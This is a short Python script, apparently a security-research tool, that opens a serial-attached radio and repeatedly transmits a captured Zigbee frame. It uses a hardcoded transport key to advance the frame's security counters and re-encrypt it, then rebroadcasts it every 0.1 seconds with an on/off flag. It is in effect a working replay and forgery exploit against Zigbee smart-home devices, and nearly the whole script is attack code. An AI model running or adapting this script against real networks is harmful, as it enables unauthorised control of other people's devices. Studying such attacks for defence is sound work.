import time
import serial
from zigbear.radio import send_packet
from zigbear.zigbee import parse_frame, bump_counters

SERIAL_PORT = '/dev/ttyS0'
BAUD_RATE = 38400
TIMEOUT = 10
TRANSPOT_KEY = b'\x00\x08\xd0$\xb4\xd4\x08\xfc\xb4\xfcd\x08\xa4\xfc\xbc,'


def main():
    turn_on = False
    min_fc = 35_750
    packet = b"\x41\x88\x4f\x03\xae\xff\xff\x00\x00\x08\x02\xfd\xff\x00\x00\x0a" \
             b"\xd8\x28\xc5\x57\x00\x00\x6a\xfe\x03\xff\xff\x2e\x21\x00\x00\x7c" \
             b"\xbe\x79\x42\x58\xe3\x2a\xf7\xb4\x88\x89\x7b\xc2\x90\x9a\x4d\xac\xbf"

    ser = serial.Serial(port=SERIAL_PORT, baudrate=BAUD_RATE, timeout=TIMEOUT)
    ser.write(b'\n')

    while True:
        packet, _fc = bump_counters(packet, TRANSPOT_KEY,  min_fc, turn_on)
        print(len(packet))
        print(packet)
        send_packet(ser, packet[:-2])
        time.sleep(0.1)


if __name__ == "__main__":
    main()
